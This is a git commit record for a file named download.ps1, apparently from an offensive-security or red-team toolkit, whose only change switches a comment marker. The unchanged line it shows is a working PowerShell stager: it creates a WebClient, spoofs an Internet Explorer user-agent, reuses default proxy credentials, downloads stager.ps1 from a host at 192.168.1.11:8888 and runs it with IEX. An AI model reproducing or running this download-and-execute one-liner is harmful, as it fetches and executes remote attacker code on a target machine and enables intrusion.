a97643ffb30678c84c259811d8d06b0715bf10dd
Kyaw Thiha <kyawthiha89@live.com>
2018-07-23 02:21:26 +0800

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,2 +1,2 @@
-//Download and execute stager
+# Download and execute stager
 $wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; $wc.Header.Add('User-Agent',$u);$wc.Proxy = [System.Net.WebRequest]::DefaultNetworkCredentials;$wc.DownloadString('http://192.168.1.11:8888/stager.ps1') | IEX
